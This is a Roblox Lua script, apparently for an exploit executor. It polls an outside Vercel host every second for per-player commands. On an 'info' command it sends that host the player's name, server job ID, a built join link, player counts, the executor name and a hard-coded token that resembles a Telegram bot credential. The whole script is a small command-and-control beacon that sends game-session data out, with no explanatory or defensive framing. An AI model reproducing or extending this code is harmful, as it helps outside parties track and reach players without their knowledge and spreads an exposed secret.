local Http = game:GetService("HttpService")
local Players = game:GetService("Players")

local BASE = "https://remote-roblox.vercel.app"
local TOKEN = "8506651300:AAEuhXSs86i1x_yCznkfefjz8vIz9gGTqmg"

local function sendInfo(player)
    print("SEND INFO TRIGGERED FOR:", player.Name)

    local data = {
        user = player.Name,
        map = game.Name,
        placeId = game.PlaceId,
        jobId = game.JobId,
        link = "https://www.roblox.com/games/" .. game.PlaceId .. "/?privateServerLinkCode=" .. game.JobId,
        players = #Players:GetPlayers(),
        max = Players.MaxPlayers,
        exec = identifyexecutor and identifyexecutor() or "N/A",
        token = TOKEN
    }

    local qs = "?"
    for k, v in pairs(data) do
        qs = qs .. k .. "=" .. Http:UrlEncode(tostring(v)) .. "&"
    end

    local url = BASE .. "/roblox/info" .. qs

    print("REQUEST URL:", url)

    local ok, res = pcall(function()
        return Http:GetAsync(url)
    end)

    print("SEND INFO RESULT:", ok, res)
end

task.spawn(function()
    while true do
        for _, plr in ipairs(Players:GetPlayers()) do
            local ok, raw = pcall(function()
                return Http:GetAsync(BASE .. "/getcmd/" .. plr.Name)
            end)

            if not ok then
                print("ERROR GETTING CMD:", raw)
            elseif raw ~= nil then
                print("RAW CMD:", raw)
                local cmd = Http:JSONDecode(raw)

                if cmd.action == "info" then
                    sendInfo(plr)
                end
            end
        end

        task.wait(1)
    end
end)
